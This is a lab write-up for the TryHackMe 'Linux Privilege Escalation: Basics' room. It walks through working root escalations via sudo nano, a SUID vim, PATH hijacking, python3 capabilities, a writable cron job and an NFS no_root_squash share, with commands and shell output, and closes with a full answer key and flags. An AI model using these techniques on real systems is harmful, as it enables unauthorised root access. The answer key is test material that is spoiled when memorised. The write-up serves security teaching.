# Linux Privilege Escalation: Basics

Room: [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc) (Linux Privilege Escalation: Basics)

## Introduction

In the [Linux Privilege Escalation: Enumeration](https://tryhackme.com/room/linprivenum) room, a foundation was built in enumeration — surveying a Linux system for misconfigurations, weak permissions, and potential escalation vectors. This room picks up where that one left off: taking the same kinds of misconfigurations and actually exploiting them to escalate from a low-privileged user to root.

Each task uses its own target machine, covering a different vector:

- Abusing sudo permissions
- Leveraging SUID binaries
- Hijacking the PATH variable
- Exploiting writable cron jobs
- Taking advantage of Linux capabilities
- Misconfigured NFS shares

> **Note:** Each task has its own target machine. Make sure to always spin up the new target machine matching the task.

### Prerequisites

- [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) module
- [Linux Privilege Escalation: Enumeration](https://tryhackme.com/room/linprivenum) room

### Learning Objectives

- Understand basic Linux privilege escalation vectors
- Understand the impact of Linux privilege escalation
- Demonstrate manual exploitation for Linux privilege escalation

---

## Task 1 — Introduction

No answer needed.

---

## Task 2 — Privilege Escalation: Sudo

**Q: What is the full path of the program that john can run with sudo?** `/usr/bin/nano`

**Q: What are the contents of `/root/flag.txt`?** `THM{SUDO-pwned-priv-esc}`

### Exploitation

Using the nano GTFOBins entry:

```bash
sudo nano -s /bin/sh
^T^T
```

### Result

```
john@sudo-box:~$ sudo nano -s /bin/sh
whoami
root
# cat /root/flag.txt
THM{SUDO-pwned-priv-esc}
```

---

## Task 3 — SUID Binaries

**Q: What is the full path of the binary in `/usr/bin/` that is vulnerable to a SUID exploitation?** `/usr/bin/vim.basic`

**Q: What are the contents of the flag found in `/root/`?** `THM{root-by-SUID-vulns}`

### Find all SUID binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

### Exploitation

```bash
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
```

### Result

```
root@suid-box:~# ls
root_priv_esc_flag.txt  snap
root@suid-box:/root# cat root_priv_esc_flag.txt
THM{root-by-SUID-vulns}
```

> Note: output was glitchy during the exploit, which is expected with this vim payload.

---

## Task 4 — PATH Hijacking + Custom SUID

**Q: Find a custom SUID binary on the target host. What is the full path of this binary?** `/opt/path/mywhoami`

**Q: Run `strings` on the SUID binary. What binary does it call from PATH?** `whoami`

**Q: Exploit this behavior to hijack PATH and gain root. What are the contents of `/root/flag.txt`?** `THM{PATH-and-SUID-leadtoroot}`

### Exploitation

```bash
echo "/bin/sh" > /tmp/whoami
chmod +x /tmp/whoami
export PATH=/tmp:$PATH
/opt/path/mywhoami
```

### Result

```
john@path-box:~$ /opt/path/mywhoami
# cd /root
# ls
flag.txt  snap
# cat flag.txt
THM{PATH-and-SUID-leadtoroot}
```

---

## Task 5 — Linux Capabilities

**Q: How many binaries have set capabilities?** `6`

**Q: What is the full path of the binary that can be used to gain root through its capabilities?** `/usr/bin/python3.12`

**Q: What are the contents of `/root/flag.txt`?** `THM{caps_getting_r00T}`

### Enumeration

```bash
getcap -r / 2>/dev/null
```

```
/snap/core20/2379/usr/bin/ping cap_net_raw=ep
/snap/core22/1621/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.12 cap_setuid=ep
```

### Exploitation

```bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Task 6 — Writable Cron Jobs

**Q: What is the full path of the cron job that can be exploited?** `/etc/cron.d/cleanup`

**Q: What are the contents of `/root/flag.txt`?** `THM{g0t-r00t-from-cr0n}`

### Approach

1. Enumerate cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.d/`
2. Identify `/etc/cron.d/cleanup` as writable/exploitable (either the cron file itself or the script it calls is writable by the current user).
3. Overwrite the script/cron entry to run a payload as root, e.g.:

```bash
echo '#!/bin/bash' > /path/to/script.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
```

4. Wait for the cron job to execute, then:

```bash
/tmp/rootbash -p
cat /root/flag.txt
```

---

## Task 7 — NFS Misconfiguration

**Q: What is the full path of the mountable share?** `/opt/nfs`

**Q: What are the contents of `/root/flag.txt`?** `THM{exports-r00T-nfs}`

### Approach

1. Check exports on target: `cat /etc/exports` → shows `/opt/nfs` exported with `no_root_squash`.
2. On attacker machine, mount the share:

```bash
showmount -e <target-ip>
mkdir /tmp/nfs
mount -o rw,vers=3 <target-ip>:/opt/nfs /tmp/nfs
```

3. Create a SUID bash binary locally (since `no_root_squash` preserves root ownership):

```bash
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
```

4. On the target, execute the SUID binary:

```bash
/opt/nfs/bash -p
cat /root/flag.txt
```

---

## Room Completed ✅

**Linux Privilege Escalation: Basics** — completed!

---

## Appendix: Full Answer Key

| # | Question | Answer |
| --- | --- | --- |
| 1 | Full path of the program john can run with sudo | `/usr/bin/nano` |
| 2 | Contents of `/root/flag.txt` (Sudo task) | `THM{SUDO-pwned-priv-esc}` |
| 3 | Full path of the binary in `/usr/bin/` vulnerable to SUID exploitation | `/usr/bin/vim.basic` |
| 4 | Contents of the flag found in `/root/` (SUID task) | `THM{root-by-SUID-vulns}` |
| 5 | Full path of the custom SUID binary found on the target host | `/opt/path/mywhoami` |
| 6 | Binary called from PATH (per `strings` output) | `whoami` |
| 7 | Contents of `/root/flag.txt` (PATH hijack + SUID task) | `THM{PATH-and-SUID-leadtoroot}` |
| 8 | Number of binaries with set capabilities | `6` |
| 9 | Full path of the binary used to gain root via capabilities | `/usr/bin/python3.12` |
| 10 | Contents of `/root/flag.txt` (Capabilities task) | `THM{caps_getting_r00T}` |
| 11 | Full path of the exploitable cron job | `/etc/cron.d/cleanup` |
| 12 | Contents of `/root/flag.txt` (Cron task) | `THM{g0t-r00t-from-cr0n}` |
| 13 | Full path of the mountable NFS share | `/opt/nfs` |
| 14 | Contents of `/root/flag.txt` (NFS task) | `THM{exports-r00T-nfs}` |

### All Flags (quick copy)

```
THM{SUDO-pwned-priv-esc}
THM{root-by-SUID-vulns}
THM{PATH-and-SUID-leadtoroot}
THM{caps_getting_r00T}
THM{g0t-r00t-from-cr0n}
THM{exports-r00T-nfs}
```